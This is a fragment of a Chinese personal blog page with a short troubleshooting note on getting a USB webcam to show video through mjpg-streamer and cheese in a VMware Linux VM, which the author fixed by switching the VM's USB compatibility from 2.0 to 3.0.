<h2 id="碰到的问题"><a href="#碰到的问题" class="headerlink" title="碰到的问题"></a>碰到的问题</h2><h3 id="浏览器打开后不能正常显示图像。"><a href="#浏览器打开后不能正常显示图像。" class="headerlink" title="浏览器打开后不能正常显示图像。"></a>浏览器打开后不能正常显示图像。</h3><p>修改分辨率为最低160x120  也还是不行。<br>后面运行cheese，打开后也黑屏<br>下载了个camorama，打开直接无响应。<br>去网上找cheese 黑屏，找到一个<a href="http://blog.csdn.net/alger_magic/article/details/53383181" target="_blank" rel="external">博客</a><br>在VMware虚拟机设置上，把usb兼容性由原来2.0改为3.0<br>重新加载摄像头，再打开cheese，图像出现。<br>打开mjpg，已经可以正常显示图片。</p>
<p><img src="/img/mjpg-streamer-1.png" alt="虚拟机设置"><br><img src="/img/mjpg-streamer-2.png" alt="正常显示"></p>
<p>参考链接：<br><a href="http://blog.chinaunix.net/uid-25885064-id-3463014.html" target="_blank" rel="external">http://blog.chinaunix.net/uid-25885064-id-3463014.html</a><br><a href="http://bbs.elecfans.com/jishu_510084_1_1.html" target="_blank" rel="external">http://bbs.elecfans.com/jishu_510084_1_1.html</a><br><a href="http://blog.csdn.net/alger_magic/article/details/53383181" target="_blank" rel="external">http://blog.csdn.net/alger_magic/article/details/53383181</a></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
  </nav>


          
          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      

      <section class="site-overview sidebar-panel sidebar-panel-active">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image"
               src="/images/avatar.gif"
               alt="nina" />
          <p class="site-author-name" itemprop="name">nina</p>
           
              <p class="site-description motion-element" itemprop="description"></p>
          
        </div>
        <nav class="site-state motion-element">
        
          
            <div class="site-state-item site-state-posts">
              <a href="/archives">
                <span class="site-state-item-count">14</span>
                <span class="site-state-item-name">日志</span>
              </a>
            </div>
          

          

          

        </nav>

        

        <div class="links-of-author motion-element">
          
        </div>

        
        

        
        

        


      </section>

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy; 
  <span itemprop="copyrightYear">2017</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">nina</span>
</div>


<div class="powered-by">
  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
</div>

<div class="theme-info">
  主题 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Muse
  </a>
</div>


        

        
      </div>
    </footer>

    <div class="back-to-top">
      <i class="fa fa-arrow-up"></i>
    </div>
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  




  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>



  



  




	





  





  





  



  
  

  

  

  

  


</body>
</html>
